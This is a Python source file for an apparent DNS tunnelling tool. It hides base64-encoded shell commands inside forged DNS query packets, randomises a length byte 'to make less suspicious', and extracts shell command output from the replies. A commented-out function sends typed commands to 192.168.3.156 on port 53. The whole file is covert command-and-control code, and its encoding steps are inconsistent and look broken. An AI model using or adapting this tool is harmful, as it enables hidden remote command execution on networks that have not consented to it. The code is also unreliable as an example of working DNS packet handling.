import socket, binascii, codecs, random

"""
Cntr = 0     #QR bit is set to 0 for query
Cntr += 0 #Opcode set to ????4 bits
Cntr += 0 #Authoritative Answer 0
Cntr += 0    #Truncation flag not set since we need to use TCP
Cntr += 1    #Recursion desired?
Cntr += 0    #Recursion NOT available
Cntr += 0  #Z reserved set to 000
Cntr += 0 #RCode set to 0 since packet is a query 4 bits
"""


def packetEncode(msg):
    hdr = b'\xAA\xAA\x01\x00'  # Id | Control
    hdr += b'\x00\x01\x00\x00'  # questionCnt=1 | AnswerCnt=0
    hdr += b'\x00\x00\x00\x00'  # AuthorityCnt=0 | AdditionalCnt=0

    """
    #----------testing with input as ascii---------
    temp0 = binascii.hexlify(msg.encode())
    print("hex string of shell command", temp0)
    print(codecs.decode(temp0,'hex'))
    print(msg.encode())
    msg = codecs.encode(msg.encode(), 'base64')
    print("base64 of input",msg)
    #---------------------------------------------
        The above converts our input into what
        we should be getting after the crypto.
        Remove after testing.
        The below decodes the crypto into hex
        and then into correct format for the packet
    """

    # --------random # for msg length used to make less suspicious------
    r = random.randrange(0, 5)
    rArray = [b'\x11', b'\x12', b'\x13', b'\x15', b'\x17', b'\x20']
    hdr += rArray[r]  # message length

    b2hex = codecs.encode(codecs.decode(msg, 'base64'), 'hex')  # command will be in base64 convert this to hex

    msg = codecs.decode(b2hex, 'base64')  # places it into proper format for message

    hdr += msg
    hdr += b'\x00'  # marks the end of the message
    hdr += b'\x00\x01\x00\x01'  # Qtype | Qclass
    return hdr


def packetDecode(response):
    tail = 5  # standard size of the tail of message
    header = 13  # standard size of header of message
    msgSize = len(response)

    output = response[header:msgSize - tail]  # this is the shell command output
    response = codecs.encode(output, 'base64')[:len(output) + 2]  # removes "/n"
    response = codecs.decode(response, 'hex').decode()

    return response


"""
def sendit():
    cmd = input("Enter shell command: ")

    #print("testing",binascii.unhexlify("14360000"))
    #address = input("Enter ip Address")
    #port = input("Enter port")
    address = '192.168.3.156'
    port = 53

    pack = DnsPacket(cmd)

    addport = (address, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(pack, addport)
    finally:
        sock.close()
"""
